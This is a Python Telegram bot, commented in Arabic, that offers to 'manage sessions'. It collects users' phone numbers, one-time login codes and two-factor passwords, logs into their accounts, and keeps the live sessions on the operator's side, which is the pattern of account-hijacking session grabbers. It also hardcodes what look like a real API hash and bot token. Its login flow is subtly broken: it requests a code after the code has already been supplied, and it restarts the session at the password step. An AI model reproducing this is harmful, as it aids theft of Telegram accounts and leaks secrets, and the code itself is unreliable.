import asyncio
import logging
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# تكوين logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# بيانات API
API_ID = 23656977
API_HASH = '49d3f43531a92b3f5bc403766313ca1e'
BOT_TOKEN = '8324471840:AAEX2W5x02F-NKZTt7qM0NNovrrF-gFRBsU'

# قاموس لتخزين حالات المستخدمين
user_sessions = {}

# قاموس لتخزين جلسات المستخدمين النشطين
active_sessions = {}

# handler لبدء البوت
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("تسجيل الحساب", callback_data='login')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        'مرحباً! أنا بوت لإدارة جلسات التلجرام. '
        'اضغط على الزر أدناه لبدء تسجيل الدخول إلى حسابك.',
        reply_markup=reply_markup
    )

# handler لزر Inline
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'login':
        user_id = query.from_user.id
        user_sessions[user_id] = {'step': 'phone'}
        await query.edit_message_text(
            "يرجى إرسال رقم هاتفك مع رمز الدولة (مثال: +1234567890):"
        )

# handler لمعالجة الرسائل
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    
    if user_id not in user_sessions:
        return
    
    session_data = user_sessions[user_id]
    
    if session_data['step'] == 'phone':
        # حفظ رقم الهاتف والانتقال لخطوة الرمز
        session_data['phone'] = update.message.text
        session_data['step'] = 'code'
        await update.message.reply_text(
            "تم استلام رقم الهاتف. يرجى إرسال رمز التحقق الذي تلقيته على التلجرام."
        )
    
    elif session_data['step'] == 'code':
        # حفظ الرمز ومحاولة تسجيل الدخول
        session_data['code'] = update.message.text
        session_data['step'] = 'processing'
        await update.message.reply_text("جاري محاولة تسجيل الدخول...")
        
        # إنشاء جلسة جديدة
        session = StringSession()
        client = TelegramClient(session, API_ID, API_HASH)
        
        try:
            # بدء عملية تسجيل الدخول
            await client.connect()
            
            # إرسال رمز التحقق
            result = await client.send_code_request(session_data['phone'])
            session_data['phone_code_hash'] = result.phone_code_hash
            
            # محاولة تسجيل الدخول بالرمز
            try:
                await client.sign_in(
                    phone=session_data['phone'],
                    code=session_data['code'],
                    phone_code_hash=session_data['phone_code_hash']
                )
                
                # حفظ الجلسة النشطة
                active_sessions[user_id] = {
                    'client': client,
                    'session_string': session.save()
                }
                
                await update.message.reply_text(
                    "✅ تم تسجيل الدخول بنجاح!\n"
                    f"مفتاح الجلسة: `{session.save()}`\n\n"
                    "يمكنك الآن استخدام الأوامر الأخرى للتفاعل مع حسابك.",
                    parse_mode='Markdown'
                )
                
            except SessionPasswordNeededError:
                # إذا كان الحساب محمي بكلمة مرور ثنائية
                session_data['step'] = 'password'
                await update.message.reply_text(
                    "حسابك محمي بكلمة مرور ثنائية. يرجى إرسال كلمة المرور:"
                )
                return
                
            except Exception as e:
                await update.message.reply_text(
                    f"❌ فشل تسجيل الدخول: {str(e)}\n"
                    "يرجى المحاولة مرة أخرى."
                )
                # تنظيف البيانات في حالة الفشل
                if user_id in user_sessions:
                    del user_sessions[user_id]
                await client.disconnect()
                return
            
            # تنظيف بيانات الجلسة المؤقتة بعد النجاح
            if user_id in user_sessions:
                del user_sessions[user_id]
            
        except Exception as e:
            await update.message.reply_text(
                f"❌ فشل في عملية التسجيل: {str(e)}\n"
                "يرجى المحاولة مرة أخرى."
            )
            # تنظيف البيانات في حالة الفشل
            if user_id in user_sessions:
                del user_sessions[user_id]
            try:
                await client.disconnect()
            except:
                pass
    
    elif session_data['step'] == 'password':
        # معالجة كلمة المرور الثنائية
        password = update.message.text
        session = StringSession()
        client = TelegramClient(session, API_ID, API_HASH)
        
        try:
            await client.connect()
            await client.sign_in(
                phone=session_data['phone'],
                password=password
            )
            
            # حفظ الجلسة النشطة
            active_sessions[user_id] = {
                'client': client,
                'session_string': session.save()
            }
            
            await update.message.reply_text(
                "✅ تم تسجيل الدخول بنجاح!\n"
                f"مفتاح الجلسة: `{session.save()}`\n\n"
                "يمكنك الآن استخدام الأوامر الأخرى للتفاعل مع حسابك.",
                parse_mode='Markdown'
            )
            
            # تنظيف بيانات الجلسة المؤقتة
            if user_id in user_sessions:
                del user_sessions[user_id]
                
        except Exception as e:
            await update.message.reply_text(
                f"❌ فشل تسجيل الدخول بكلمة المرور: {str(e)}\n"
                "يرجى المحاولة مرة أخرى."
            )
            # تنظيف البيانات في حالة الفشل
            if user_id in user_sessions:
                del user_sessions[user_id]
            try:
                await client.disconnect()
            except:
                pass

# handler لعرض معلومات الحساب
async def me(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    
    if user_id not in active_sessions:
        await update.message.reply_text("ليس لديك جلسة نشطة. يرجى تسجيل الدخول أولاً.")
        return
    
    try:
        client = active_sessions[user_id]['client']
        me = await client.get_me()
        await update.message.reply_text(
            f"معلومات الحساب:\n\n"
            f"الاسم: {me.first_name}\n"
            f"اسم العائلة: {me.last_name or 'غير معروف'}\n"
            f"اسم المستخدم: @{me.username or 'غير معروف'}\n"
            f"ID: {me.id}"
        )
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ: {str(e)}")

# handler لإنهاء الجلسة
async def logout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    
    if user_id not in active_sessions:
        await update.message.reply_text("ليس لديك جلسة نشطة.")
        return
    
    try:
        client = active_sessions[user_id]['client']
        await client.disconnect()
        del active_sessions[user_id]
        await update.message.reply_text("✅ تم تسجيل الخروج بنجاح.")
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ أثناء تسجيل الخروج: {str(e)}")

# handler لعرض حالة الجلسة
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    
    if user_id in active_sessions:
        await update.message.reply_text("✅ لديك جلسة نشطة.")
    else:
        await update.message.reply_text("❌ ليس لديك جلسة نشطة.")

# الدالة الرئيسية
def main():
    # إنشاء Application الخاص بالبوت
    application = Application.builder().token(BOT_TOKEN).build()
    
    # إضافة handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("me", me))
    application.add_handler(CommandHandler("logout", logout))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CallbackQueryHandler(button))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # بدء البوت
    print("البوت يعمل...")
    application.run_polling()

if __name__ == '__main__':
    main()
